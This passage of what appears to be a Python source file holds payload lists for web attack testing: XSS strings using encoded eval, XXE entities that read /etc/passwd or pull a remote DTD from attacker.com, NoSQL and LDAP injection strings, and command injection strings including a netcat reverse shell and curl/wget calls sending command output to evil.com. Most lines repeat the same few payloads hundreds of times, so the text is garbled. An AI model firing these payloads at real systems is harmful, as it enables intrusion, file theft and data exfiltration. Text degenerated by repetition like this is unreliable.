    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
]

XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>'
]

NOSQL_PAYLOADS = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.username == this.password"}'
]

LDAP_PAYLOADS = [
    "*)(uid=*))(|(uid=*",
    "*)(|(password=*))",
    "admin)(&(password=*))"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "`id`",
    "$(whoami)",
    "; ping -c 1 127.0.0.1",
    "| nc -e /bin/sh 127.0.0.1 4444",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
    "| wget http://evil.com/log?data=$(whoami)",
    "; curl http://evil.com/$(id)",
